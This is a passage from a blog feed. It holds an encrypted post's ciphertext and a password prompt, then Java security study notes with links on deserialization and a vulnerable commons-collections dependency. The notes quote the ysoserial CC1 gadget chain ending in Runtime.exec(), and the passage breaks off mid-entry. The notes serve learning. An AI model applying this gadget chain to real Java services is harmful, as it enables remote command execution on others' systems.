8acab462d66905af703914a75ad18330e12f394cc7903aa31dbef175fece813a8ad3995f750a70f54da1164d0632b5aa3e6e8e3d63887f6687da527797e7a6ff1136e19951a4104f2961d3fff5fbf2381b5f5e1c8e16288eddbf6cc5210162b64c66d56942f8bab8593b389e8a110ac804aab112578d83e44c477320230f1e24b86cdc45a39106ff2fa9f7ab917d3132141457514f75f1b643b9b9eadbad9746781467813fcce839f4ffa08e0e33e9f41372bcfe1faf7993575f8f5a2c81200c1988a7f1af10048a41d42680a90cc007b2afd8db2d598925d2db839768abcacd88b9ab50c35407156affd4c000e20e4675bf0f9ab3ca5a67f7d0b53de59ab300829d605dc8b68bb5e1409e0c8be3b3dc06a5f941812dedf67570b53c0f13ad9a33a4481e7331547aedde7adab08eef72e249736cc3e263791bcc5b9e9320d5b9ad814e869d29713a6836e14a1d8d4b3e962a4380ec383c3c0395756d5817146f5e8cb45fa20b7f5bc6ad240b47e5f203abac53f6cccda7e2b99e74d45cca91e95a2c837b6258fbd1355257a5f3b45aab905a8abd80b033deafe7336c4820b14e1c237b06fdad58bd8d32ff4b6938c2094634d591a3f6e0560b49fe03b35e7de99719d72500d0dd792084ce68271e2afec0cf7784c3e525d57ddd9801225ce6b59a58faee3bfac05e361760b6f0a0021aef2f96c371963ff9dc316b8303b70af06892ce5b459a9d7f0dd12f878fbb17cf257897410f491b3b19b452cb2c9df64365da3fc13dff38f083c862986e37720836a7dbe5dab3996900d0c642f9dee043474128276b5153d1a3598ecc2b7855a67e025b7eb05fa5a5fdaebb83c571aeb25f6bde64b6da30538b739891ebee012c78b9af2c8cdd98d9133d13743a05b89635032f3cf486aa82c37dba04d2df3f5d25711942f63ec19b15527b7f949c43d0853b09a6a350d670891fbb4a272c97556c5bc818beb2ce6444b2731fa224bb8195b977403cb7f6cfa09b605c53768b0fa2000803fa499ec7ee8f928588550faa056295932d002b563fe07a79c5b7387b3a8104ea3662899305bdd052962850593d562b7f36d8abcb0e02bbf08a6c68d819ee2441ee6f948f24c1fdbd254795ccd75427bf34580896eeac4136093e9b059b173c749e014414538b9a1a700dc849232641b5076ed6dee29e5a757058423aaaf4f5a25c057564df7a1e62c6c8fead4fa0a0429de79edc443771dd1f3c9c8bb374d182812a5beddb19dee84710253b9b4df82058066cb065e816f278d22d1a593e078f0c1e7c20d7dd8e8e2acffeabf489360750aabb5af82062f5478d803458e2ddd1f46abad0875351874675d77d4c6b93da5bd061b15c74c59f52e4307b2ff3d19c18f2578b6d475b37ea46665c2147723f335fcf921e1a7441775513aacd30391d4013319a4acf5cce4753e342c0ec22f29fb3c242386c0cf2bf42699d7a8610056cfe2f00ee97293113ab3c11847327e10f4c6218cae4f1c0a09bddafb51bd90e9b0ff1ac1182b24a86512a11445cf49520db46150bddcd47ea235195f24bdbf4bab72fce9b469742cec87be06665d367c7db2a18058ee34aeb74965b8743e61a417967ecc7f29bb9b2abc550ea7b71ffe3019f0024bd5fd32b6ddf1c2beaa9db817201f3f82694914fbdcb2fcaa44d850e1756d461436e8be8cb6e2488a19167e32687c2f6516eeebf264493d8cbbcce41fae71929ceb5a1aaa9b9eae4593dbca885bad8939e5e389e1b962440e85f73aa9a5c7ba77ec879fbe47e5187331a93a733e3f2f88635a5a34b200f1d8379520ac2b86048cf391436f30130bb07b29344698fff1e1c88b5d080a85892d2c09f498089d400dfcc564b7612cfa481562ed5e756efd3c3153ebe1f2f1180e389e0cbd1b55dc345c7c9fa08e20257d43273cdea8951f328b75ea2621a76c9d0581d716f8d6675a06ad3c7b7291bb76c9f0535d7306dcb395ab4fe9d785c0317014c489b55c3d8f47966546d8d06b5bed2a98c6091c5f1c395ef252c923ef0dad1f3079aa2c9190cf490b8ec955e68fd81ba244e5a64b7021ae6fc73088998297cc4b77a50a8bb2b4c21ceaff21a726ec16f7f5d4dd94f35780ee2d1effccb8d7155cb785d925b910f22ca6a35214923fd92de414d1ad122fe1c30ebca1a9b0c9635173a0abbbd9fda18e7a56c6065553813ff5ed31b302951b0dbf9a1c5882a4e107f34f4a7699f5705800e2ba26ab77ac593c41ccc659801164bcfe50d3f44760c1e55b41eb981b42efbacb9201ec37b9dd7f61becffdea0e302815421d85b6adb8c732cd264e9bb2ede334c71439f3ae84089376b6872a5fa1b7750df6860c03c694377ed22c81ee10d3840a38deb2d5e6d2f38e2d61bbafdd10c3ff2f23264f2c3eca234f55c5484a264868cfb52a2b4c6ec29e9d9fb46bb27a91237ada6485790ee8888f0123830bb80f0a1fe0d73f5537d64def4352edfb8f3667ec716b007ff49c545d5684abffd6e851d2bb1823a0f6085c94c760cf3fa065c1716dce6bbd00782abb9d1e7b09c71b9a9c62e9e4aa6f5c1f2d8fb94fbaacb3cf3c635a306564bf3b58705d5c714bc97e9618d1209506e2338e7f69a42a2885b433923ddd41ec501cb33aeb3623dadfa33ad564e2ac794d570dfc52d37bb3c0d485ec9dda17185aad485aec2e609dc78b619984d84cc0cf27c8a9a94aeb2f1059b2a93f538a168fed85f7c3cc7b075739fd8f4d19ba275ded11a2358b990313a17f76880845c24e154df852d2ba233aae5f05e1c30c3fd2b97113bd6e906d63a3c88353f554cbd15dc80407d64c298b221cf302a733fd9811a5faf028fb42aba757a58121258ea9c8fcdffd9ca159e3845fe67ca84b2aa0e4762053980050f060f9e7205c0355ba3f0fb5bf57aace625dcf8dd8d1449bcc399f1454c6798580a0cf35bb997eb8ca77e9e784668090bc599aacf1b8369a1553d7e8e4da6fb0ad17994fe1627695c0574c49eb3eb80faeb9cfb48b7ead3554479b13d61c47b022ad17401da493d68d74b2e1ba7f3d10a1e154464f95d1774adcb108e6f370bc0e9a2c0fb3753e9e8dbbac96d7c8dc43fbaf8722c5dc338bfd7593eeeaaeebf796929629019644fc55b880f1aa1f0ed963b8c2517935aa875a0028e0cd7d182ce3b7c3c9e34d40b23acdcc4c2a4e47b5fc1279db9c985af21fd04e41a7517a91974f3cb7f2619d7d0151af285afdb60be9c5afa5d96fa9d30dc8b17e9400519a0d355cc27c99c4c6ca98391c3d8ae0278719d1738dddb507d72d187788b3b48638664126be8f5a8de66ad32130bf3d59ccb164dd81da3a754108c58d71a75cf01ede48e4787b21ed3b1a9c6a1da1e2e1c2d8ebc47ddbad6912b317189e11c242e1e4c4eace277cf250dfd2d5120d06c65f0ba89b5f7444f0039c8a5b45384994c8eed2747c819afe18a3f9223ebbd471f0db4f75201bdc0c19ac8096a706ad2995c4e804b1af1a1105a962f190a9b7cd49f5ef489b6a7e3055e586964583258e776c6de34d80c582d4b18ae4b13214598810f411b44510e46080fd190f04235d66f13adb606932c71d6cb67b0ae3fc097d3eec32b096afdda1a73b7887e05cc37b5a7b6f7618ed8735cc6681137eaaa328d61e233175f3b35fd82d80109e4ee1cbe2066c485ae1c544efd83bb577349c5386ce3cccf517069ec12e632dc36cc83333ddb2dc52809cbd80912450dc89d1ab8d14ba8d48359ff6135ef66a09572b304868f007e1169f81dad8fef322d07c69b1131ed029a72c66651a951f12e2e77c7de7a4cce81ebc9bc1d27365bdb3fdd2a038ed9fe5a122e236f9da9ea928ab91cdfd2cf034f415397528d659264f9dfdb75c01163a8d53bb8da8da07a724211ed02946277a7e06512d8a6a585accdd5a66dcd4acf015050e0119e1e7f7c757987b2b301c186353f50b19c50c2985ffede1a60411b5a03896337b70482f85183d8fc1dd5226c41c8f594d80a5652e5d72536d4c760029593fff1091400c8eebc41b4a2568b58f326646b72f6dc34d1abd4b48505fe253d56e5d09f9a457fe4376b79856b9aa91f8b49b71b5bd2d3f2f9e51d0f446c4c44616203af5cecdbdcbc983ad807dc556646f12fbf30c274cd7e7e4c57a1f1dd2e77eacaf44c46b3a8004953cdf414cee0e572fdfdc8a12c64c6092f7430d0754d81fd049a4c02d72438ff09a26dc3e33c4b2b960e3f0f34674885db87fec2069f9947faf8c617006998ed8b4126c8ad358e117fb9b531f31711a1120f096ae0d0a84d693a2dcd061db9aedb95e8fbe781b2985e1736f75e81d6dd36d8c80393896eebb9a4615873f92e354f5a51e3521ebfaa45ab0c1e12414292010b62b254314e66965e34966422336a5e7c64b22a85304d6f8f5e67427f892fcb9942ec108ace39c6846d244e4144a5fd0cd6718cf9f962fec79f67a635c5ca4b3caf6aa2133a24cb9f0a25c0aadebae08acd01200299a1fc3089f2c4ae288248f2e9da25c210b7e61d99ad1d940f1d53d624f9023881a428c1c8eb11bff6aa29df87cd9065ba0d62922e29204d2b155df780264e319eb34911cb08a2807eba144fc43aa1c62e64726aac9a61f374060e1288fa322a07fb205013f9071054d36ef4b2c6a5a0cc8931374a3130c69e172f73bb983aaf8b576492a33c4ad80353e629f40af5fae4e3bc5925a67a14c8ae78b7a6c2ff9ccc296c4aec3dd304c840edde789a437269ae31ad4d31590108c294bb1655bfb6ad7f04e85500ba07973eb1e087b0ed6149e600c53392974a3ed0a1a1a6f754d3b9e631f9dd51b1eb0f6a174f64903969b775ee67ae7406aa486f106ffc4d2816cafc916de1546a132f8deb796685c0ff7bb94ea6d21329801629df9e0d389fa7a27ef12e2c22d8d2ac1a7d97b8e2481e38d9592ca1a9c0dcaf48e00e621a25d0754d6679208d0acb8869bf3da8671005b13eae19c40d0c286e2a7701be90f86a67518ecaddd96127d835aeb4c8c512b9abc7ad9e319126888973315bf7906d6a365a8f8a203825f31d27aa1e9af3278a31d61da0313662a8075f47fc60b8dc7355264b1833e2c265c2d9167c005e6fccfaeadade724ed96233ebfcc7bae6c2d2586912f900de4975aaf78b8f02e5d893f18e941df3202fb7d529307a6fd8def6eba1d35785feec636aa274906e757ef6145fae91f84c8786d76d86fdcadfd5092268a3f859d9edaa504874cc19863142928820170e99ea265eb82879d6542d0c63a1ed5e4d2e85952326b3157027a2fafeeb45b214745c580928569418d19350d118c58bccce2c3af1ff755763eee913e5b8650a946e3cbf21c5b80721e03bc5d5afb90af7fd7b4b55626147f50568dc56623bbb6b6feb6d0906247f0e6e3db7a13e5f464a42ed79102d84201f00dbaf4928438a1371232f078c6b2403d230c35c2c0d3519097ec8c4f9c1793ded1ac26d91d65347c873dae9f481fbbcb08d1f6ed05d3147c3ce6e3e4a41df5df000527cbfab2dd122fd38b05e66bbf46170ae3efa948a5e39669773c365be3602721c6704abc2e95a1c260c18cd16013b159f81286588aa7308d90f90b7acfa75dfc164f12431159903a948e99f8e82fe1586f6aa882c0cb73ecb78f26f781b6728b2c36d0788659e8bd6434668156ba145abe2cf4d93af7e499be1a8d969960db8e0c486fa3f1217a13cc52770ebfd04c913beed49b6a1c14229adf5b5e2216a2ffa75be9049b9445808c2b57ecedb811eac362de4fc72a6deb9c9c1531ab0f686805f764103c3c89f7096c8214984e4469d451307f1b00c0943445516c1b09167b6f82db34912c9f11b1a5ab5e25ad6d5c9d0df1e7b855bedfa4ef277623977080034c5b900240b1bcb134ca69a8e1c52d7809d9e8e78b33b2e440adf33a11637260abb62910b902484b8bc4558b0b8c8395eea8c3624aa45eb2c6a68c2b67960bda1cef7c720f31b7e389e18459a90ec2fb6c33fd22deb396fa6f9da041c17fdeef52d06d1f7384bacbb04953613a73ebfdd57055f9b0eb37b48ee3bc8a22e1d22f9d1ce4e52f4d7c07df9e5636f5473c792ee27f21a2bae69886b2ad68285f70f8fa85672fc6478adae5d080fbdb710b8015ae8df6ce773c3e43013b18a9898957668d917e775d79c8670f5dd654f68cd095fe31e32e05dac22ab424b31ab512e4db43154ffad1ea448a46e1cdf96d48c627edb99cf66e51dabc7a483ddf6fb9d443441e6a8824f04ee15f0af92d2302f599822587062e1b7487818c7cd3b553ed119b89a4994f55fee5342672df88a9911621f1a0843d942294cf97e14820babf18ac61d18a3d5394cc38742275863eb5fd8cca1f3b8a8a42af8f8cc7766d4d93d0aa854d934f0b075ae74bbc19529d94f12da6e110c3b752850f40b44f2bcf5849eb8b99b62978da4c2ae734033288bc00b554c0e845709201ef685ed49b0f2c684e0af5a7f0db820ab7241427032f507ebc7563741b01d11219c52b5b302db9c46fcd90cceea8e47b439f35ab1e30f81b2d0a92e311c5d8b8390921173d6a44b6f3e3636c7d343e0c7b364e50451b45622378ce7ffb41df58ac045f74e5be3c9ff2c3b4dfc39078b51996e9c3773fa625812b45673f5bb8774a176dbdb62e4f5b0aa33419939ff681c06405dd144a875f8c56959aa2f75589f75c5852a2a65094aea5aadbada6128557c59250bdc6f3c1dd8227920223f325b0f78d58ca77ca72cd3bf869c1b22b5b12e3fa9e6e5e084ff4fe2c29498d599d1213fd28acd94980759c3d2fc78b4164bffcae6e06297b67e4f71d69dd1f233d5aa4470e2b4dfde0304e009245c2743789140f6a099b225ad059fe0970b9333fe40cb73958d236fb06b9a8e484e01a29ff5bcd73426f370badb8ff453d5876c94a1116ea31014d2f9a109d85377ecc1868ba8fc186afeeea3657efd325096d119d92b5d4a1af7559747fcf6ba27c0b3fd972c01e80b1943a47778414a7d6f7c12395c27b5e4f748e37dab21d4ac690ee0b434b6ee5c3b1601cfe8d2359424f550b0484a5d1105ab35b01112881d627b2646e91b3b51293b740737e180bad008b88c0e900c92c0e779bac8efb592c778b86e731b261137c12ddf1189c5521eb2a86498896fdebcdc29d02207ce96f9a49e6567fe30a6dacc65e6579b732eb97207db815ddc9c7971ea46c639a055c758c665cb8545903be0a68317c2f5e8499c9f3951f795e3bf15d87a9b19446584174a4b1f5d5e4d2c6ac35c1e6f3825b91ec73080dfb67907cdf6b45bb5b3773ff73578050420fa00e5540659efca75b2aaef4be1ef24bc0e88d4849ee6f99b940d6d933e17bd03258a2bfc98863cc5f6b431b80483dd9021bc427987f2a5e84bc4df9c97f2f8d6562f9c38305130c664e3538c0ba70430a71af95197f7e150cc3086773b681ea2678a42fcc35a5776636bc173bfc5a9b21d8d00ff47ea3511352318ab2df4b224c492e0f9646cd17f413fe8c621f04c5713f4554f6bdec3fddd0067b5f95c228e939f89b376fcb75148ec5d486bfb34287f49985e6063e7bcbe34d93a8da04b4eebe0f04afa283003aeb391da810e232fd5c4924a172fad24ef9b1215a0fabf43d5569754c427ce53b356b3e035353507f70c8c3c5aafff67a8e9322b1f793b039724875f83793f311ccadcaa4c898b1ff6e4f7d94d7103999164df6074b8978f2fdda90c0166f8881919cf70687cc2a0bce1b2a853f1c46fdb79a8bcb89c9223a5a77ed2d1dd89fab5e05a87b4480c92a52dc8d8192754db63ce3d6b5ac578a7bbcd8e325aa7df58339556c2cd57018ede8c4fcdc38f66ae6b49092401e8a88b779ef97977eebde4dfb3c03f0f3f957b171eb60d1b4af1c77a61f6406c1357102ed2e60c63574b4605b890b130e8c4104a63db7ed68ff537b26650a92cc8f4d1c6e23fc170edc801ab7eda202e59ba3655224ebed1164444c7749a8d372ec0c81e061bddb1862088d42def70f681522854736ba3477c8e2e3895d48985f078de14f4058678c93ce5048e8ecaabbe00701aea00d0fc4b566b4939f5d5dcccbfa5aa15e0ec19d0d7f1ab2725dc95fbf4ae2e29b51a2ba9b22be2babf61172b9805f16de0e1722e4fa35c42e63a62ce88b4e3f17c84afe98f851fbf5eb46fce8ccfe9fac98c16e8c1ba6ca4dd84c02e056622a9ce27743a9a57a33d85f8dee8031f78135390163dd5dc86d32b041944ffb8c849b28098786888a1acf77f2a4adf495675ea5c3d3da5c5ce6f93dd1b070831d268dabc7a374ecc54ddffdd8f23e2e7a64db618e03a025d5fabd2ead3e229f6a5f61b430edfa998a206d48f08ed087a1c1106569a4588f583154ab538e2b34d74bfb9609eeec584eb71e7cfe85523a2d851ab6505381ff48828531a758f314b8dda3346c7d1a5eda05a8dcfb335cbe456e9288911d469af5952f5a1920132d6d7d7a20f8167c549d746f8430cc8a194b4bc8ceed560b1c5f96f46687e87c3b17d8220c46b5fd296cef3ea677078acfbcea1e153d2073eb0e0b3f39526368871fed882728d91b7bc2672b66a964d8bcdeba743cebb70b67090a977dabc1319b3859c7025b160adacbc0532a5e6bf2e355f95f67e9b8b702f50c10311d80049ff16a7fc5f6a449b59bdd0f021ca1fc9bc73dd89374d9800839989bb8b4502fac914ef5c8ccc267b9f42aeff252bce02bfd0095c27df5fb907de787ca8f890dbeec11cf4fb9fd3e81228bbd6458681460c8921245e811ebef179f8c4f752c7f68105015202c86f4eed3e98a9fc8aab91e899b12722924ba16d890ef99b37e40bb8d5a1d3d0224415f21eca51341d465f6c7f03f02480cf12184ffe405a9d9c0530525f0288491499e4e58435fda28cfaa67b4c224cbd94ef8ff66da4d5e190e2961d8d8398659cad112a514c587b6aa95bf22dafe8e031672438d13e33ca5289709a9e740a50c32bd8241571159afa9ef7b455c470f5f6e89bd1889f16459b63c7975d928732d0659b9ee4eb91f78c8ef9a41ad6446e37ac296eae30c06b7a931159ac76d7118b23dc945dcf43d1f4374e13430975b1b2a31f01427aeb5769e0601ab48341ab842558268eded1c2e922044c11537a6a5419eec8bd99fb11e65331e4ec5a74244e8e1aacbb21116f18c39031308f3398533176e655f4a7f24df598286beed1fab8d314e52f705c7a47c1d631c62f53153de766398e9093f63dae1f6cc40bc1a51cd12899fe05ed864a1b70d91652bdb4a418d3522a45c359c1206035ce5dd25866dc328c08d072c59dfefcda65400c0d8c862bdfcb2660913de15a3dcd3acdf55413f37baf42e16257c14e8c49b9763c6593065ae808ecedec20390e56336e242e2c3dbb97875c69d15c054b433d5be9a45dfc6a0f3b819ba1c00fe25e3d153bb3e3971889bc2f0da214bc1749e9f89aeb773e6bb769d50ea254d68cdb2c2ad7e05c621efc1be229e5da11925239c923ae8f161c399b68e6c1d8752940fd44a0a0daf5f18597acdaba6cb66b5d1f3b99061e9d696462eea4c7efc73606e78513ececc0e6fb556d632df0ce2f15b720de22534597fc1c59443738b2c65fd1eabe892625f915aca26cb2d90c8e54e54515f52ac503a375d013e94039512724f94efd77e7209132b48dcce3bc06a018d04b76941aed7374ee10be16d8270ce5b2ad301f2ced1e888da13162eeed0d791b7039ac34d91b392fb3a456ce9f12362e71c491106311c914975e84d1a5bf1a91fab512647df05d1b2a2739bf971f166440699f99d5b8e5f58236da2231e9b1a65b0408498dac6abb9bb7b136fdc57ce3d62ff7c7c70dbf7404c12cd5abe0e1fe06e4f80639bf3a4b787d07b8186642b8fa73d7588af7a8052c4df16e03b77ce0c4da8955dd4dbf0b1e429e4966a8f4152c233fba8731c9f83fb6cd125f04cecdbc8f07f004eecb51eab90b5f3aa44e4e4e3169cb4bdb5b2d4afd621531c4c0af141871a59a54745dc9eedbec0a914dcf41b9c146cbf31836ff823234fa1e9e9c3d395abf01e8d46c3b3b6bd346ab4b00862666acf963a3dad2ce705d27466a029ca38e884ed589153c6c44b14def849b12d86ed56496c9c707c190dcb175736482ff61207585bba076a472e4af32b726aa051110f82ca24a62bc1c9773e3e7cda7f2127bf3b569f3975b9bf5d566d57ba90bd93923f0900ba7d1b6a370a4e68596c7edbd63aa1770713676384343f493f790c2c1537e85e9594629196ae27d0fefde6cbdc52b0d5a59f2f983c8707a4839ae911cb84e1f9d5d64aa456396264ebfd68d686835437f8357bac18e7210d20ee2f6607ddbeaa33340a8ab484ffb0a6b41b579b497aa2edccf9ed8ebea547e12180fcdb4a4d7b972d7af45dd2c09de74f9ed52f07d9b0b40505222042839978c4643f203288b57ed714623190ee6af473d2321845fd8df6b08a3ec50e09f4e23348feeb1e0521b8e1f5d51395b8167a5e4f32d02be95812ecdef1a05999e71bf3eea1b3786db305dd6ba3c1ab910a987c33d51ea3c0503fb33840752e8ae813c98c74c5d20c5dbc312248208b8309459c4812d93ff5bff79b324784d22a5b5473d29429b83b915e1d665607a8ed10a4a9af4cbcfcffd413cac454ab308f825686f6f7a419e0eaef796de9ad606581df1a0db8b1c86995c2c716592b38e19acc052bfa90e5ab4a72b657c646f6ad74324f2d5da16621bb7ec5fd05a17f4105927b2d2377dab1f9b19bc94d1e734e0b941efbf568b18381f40d0ebddf08069e3758af6e000d02c8972b55cf0abd5418b8badd2f5f5dc1e29f08ac6b48e92922aff9b1585badade1a0ef5076a441ccefac0b13d6c09f7b3b29b8447d29fc89da0ca71c36061d6b40c7fe04a2ffb2380aaee0a9996848efcc03e56513b5e83fd5fe6bc73b617ce9f8e784dd46f9be74ab8e8ac828cca9c3964a7d418bd6fca28495d2422359ebc5a26aff1c71f177163bf3f675f914f660b96e5e198bb667cd46208df08fe99c215979d47e1801d83a277e5d8c17349b19504c0219079ecd44678d866c7850d79de02c8e9ffedd9df7c68093e625136355f75264d6520b9269ee1b88c44140311f2aa7815651b603fdbba09cdc4dbf2c43a60dc070efa205f752bc4b3abd4d3f6e3e3f5f008587659b7c73ffc739ea227a6e5407dea53fa486d09532a4a7b70e6f9b6b46ce6d8ca4aa3a5813c3b39bc1daf9ebec8f36247a87d71fb80a8f9b172943a93d74434619d6ab35286d4a69e8b7930ee9ce5356951f9e3e50d005598ca1fe22b302bdc66f3fd2b5e49dc012908989a2b1dcfa98b7be28af7516cb55a6306729f40045d0ffef22869aa65b6ff6a30239db9a86c1dfb4738b24d0e26c902e0a96ac64abf39ebea1b996ccf301847fa7e203cf93449337fc3c116b61921ac8097c104c2b72f57060e9bdf6d51eacdcacdb85348f1135d499c9419e240e5d25196b90c7049f6dc6fc4c6bf9c8fbb08cb13e55017ad8eb88c9857465cb19e1dc4c6518bd32103d1447d0d65b94d9a1b21b8ff6eb28d7ab01d3574ab4c8584f365d4c42f825d0c58d788ef426679a5212d6f3ba7f04e2bf11badbedb733ee18602269db182590abdd12347903296564661a81841e996e1d2e7b8b370a35235fc6509d05c72c7eb9a5a624379b90bc8560749def426416fd919ad44aa79e2d6c149aca33ab0e9e3f368dd3d1ffedbb2412da472b509542dba2128888300220f6eb1d8f86906a84413d3fea876e5c1bb92b415d1d0d72b53200749799a012923e1a153663d214ed6695c0307e8459d7209cca720edd5b0e75a56a8ca1d070ca5c4a958064b53c2be87e62c7db6dd302dfca39364e4e1fce7af8ccf4cca709c629da1b0c46b4e978b219ab47a88c91fa16647f4dff6965ad82355b797d96fb5334fdd7bd58d727a0e749440587c3269aaf5b0ee530021ba89fe902324e971bb91777653263c9be7039096e366d7d29e323daf8fd725c1ae7048e3765160654bc9b188ddaa2200561c1bc449f8657f0283b61120c2712aa9c81a593deee3ebe6825f425251513cd65b7badf228e69a30c642557d0e11f4ab0891805db540d9a65bb875ff118dc804fa4cef63d3fe7b4103cace68ba625d51a10bce27db6c6dc9e3be6c47accf28ed8757e001d14af8331e3a482969a68012dc6132f52e923b047b1e1362b94ab34ef955dd9ae064786e2061abdbbced95ff900c4627ff6af8c763a75a81675fcb57b877635612f58df16a91b88b2bc1b86d3b5a40fbdffea1e34c6a8ad8a3bba9fc03e0d24c433f3e7ff67efab853756a651cdadf40ee5a3aa8df0b9858540c807607f1a54139f3ba266a858dc1af29bf6698a9cb8c855f037c68fcb9f58d35896c2267623de4863243b172f1543b5e14aa8afeca2a31e5d7f6e5e7418f4ded285325183fc5282af244565bc334fd9adc3d84bd0fb19666f93d7c84cc71316be33cbd19f9cfface2a13d02870dd6377efb1e13bdd7436f65dd4e39dea0dfbc9bd568d23ec4a53a0e186546bf3fe34975d2b264778c6b069477de5d997248f21336f94f47c54b6615c73d05f7e17648bc5654b4adf05460ad6732698622323680dc4297574b954e6bcc0e612026ee0067e0328712e51a7c22d826efa357d3d3530b826a1e5bb7bccc0bcbcef3a0082ca169dc0d574594b817ac54eaca52f0d7a61e81a385d968c0189c6ebce658dfd99fab8a0db68e277eb5cb2ff3e084dcf0100c06fd030a4458e0e2e4288e132b4ae98bc2c7413b776e704f66e776f8a19699242a9989912099690cc1571ada9d2c28530e085dd87dfa4210b7070d27adff514ccde41bc5dbe6514655d96672c305aa1b06358ceac5010a7f7c15568b82653e70b3ec683e43bae1d249da383f0e7002ccc0c2862d07e8f5f4995fdd81204385e396d7abe187c2a171ac071a83513ded302b1d4a36f4bbbfedbd41815b49565535de05baf51c8a1fe44c1fdbe2a3482e2d94285ed1130682fcf58a2d9daad376f8e43a815a0178843b42bcab3d175fc682dc3a318b1f8b36cf7f8eaf147f662ebd098440086a3386418f37cbafa56e681c082857cef4e105ac25c8040fee5273a36c13bb99009775d1d5caa2c8ab5f6558e806192aac185a9a299a8c4faf11df276dae03846eb29dc05ef3605cf5a719eb1af30b7834d375a23050ed64032b6ec825026f4a18911ca70bb01b639cc52bc8ea8eccd66ac053ae17419a9d876dedf2ca1c03eeff94e3facc0d0ec95a431c2406de74d2f9378048ba5ec980224253529dd9c3323510b0b9186d7ce7644aa7bec16d21b92991ca41b04bce98e8188441ada69b11e7499f604b1f6bf0dc1d7e0626e0914a7a67137dd31c925732534bade1475de000ef69f4bc9b5402fbd057c467082cb283ac02e6bfd17eba0a48b61a44c512c321c4d860606c0e53761feb6bb68410af9435478ef2f25b36f7e5f047f0f64488c7706e7962fbcd58cbb31bd3889938ccda5a3c0f158aecb717f1d7882bfb6cb4e86a7aa48aa6981aa024ba0664798312ec156d323864d8ec5715cd1d918eec16ad0c09ce2f6132d622531bc9d426721518d9030ebc4849d806ca7a7bfb8923c669e7a9b791c014ce7922643cce2f4723596db3f3374ad42a5da968</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>java安全学习</title>
    <url>/2023/03/21/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p><a href="https://github.com/phith0n/JavaThings">phith0n&#x2F;JavaThings: Share Things Related to Java - Java安全漫谈笔记相关内容 (github.com)</a></p>
<p><a href="https://paper.seebug.org/1091/">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上） (seebug.org)</a></p>
<p><a href="https://xz.aliyun.com/t/9409#toc-7">CC链 1-7 分析 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://huaweicloud.csdn.net/63a56185b878a54545945a4d.html">CTFSHOW web入门 java反序列化篇（更新中）_java_yu22x-DevPress官方社区 (csdn.net)</a></p>
<p><a href="https://space.bilibili.com/2142877265/channel/collectiondetail?sid=29805&ctype=0">https://space.bilibili.com/2142877265/channel/collectiondetail?sid=29805&amp;ctype=0</a></p>
<p><a href="https://www.anquanke.com/post/id/261724">URLDNS链&amp;CommonsCollections链详细分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p><a href="https://blog.csdn.net/qq_41854911/article/details/122159068">maven引入依赖包，import依赖包，编译运行maven项目_引入meven依赖_小熊coder的博客-CSDN博客</a></p>
<p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></p>
<p><a href="https://www.anquanke.com/post/id/82934">JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>环境：</p>
<p>cc1：mu85（jdk1.8.1_111）<a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html</a></p>
<p>maven依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>sun中的是.class不是源码怎么办？</p>
<p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">jdk8u&#x2F;jdk8u&#x2F;jdk: af660750b2f4 (openjdk.org)</a></p>
<p>zip下载下来复制其中的sun，然后到对应jdk的src解压复制即可。在porject settings  sdks sourcepath 加入刚刚的src，maven 可以直接download source</p>
<p>查找接口的实现类：</p>
<p>IDEA 风格 <strong>ctrl + alt +B</strong></p>
<p>查看类或接口的继承关系：<strong>ctrl + h</strong></p>
<span id="more"></span>

<h2 id="不同cc的利用链："><a href="#不同cc的利用链：" class="headerlink" title="不同cc的利用链："></a>不同cc的利用链：</h2><p>在ysoserial中cc1、cc3、cc5、cc6、cc7对应的commons-collections:3.1<br>cc2、cc4对应的commons-collections4:4.0</p>
<p>来自ysoserial</p>
<p>cc1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		AnnotationInvocationHandler.readObject()</span><br><span class="line">			Map(Proxy).entrySet()</span><br><span class="line">				AnnotationInvocationHandler.invoke()</span><br><span class="line">					LazyMap.get()</span><br><span class="line">						ChainedTransformer.transform()</span><br><span class="line">							ConstantTransformer.transform()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Class.getMethod()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.getRuntime()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.exec()</span><br><span class="line"></span><br><span class="line">Requires:</span><br><span class="line">	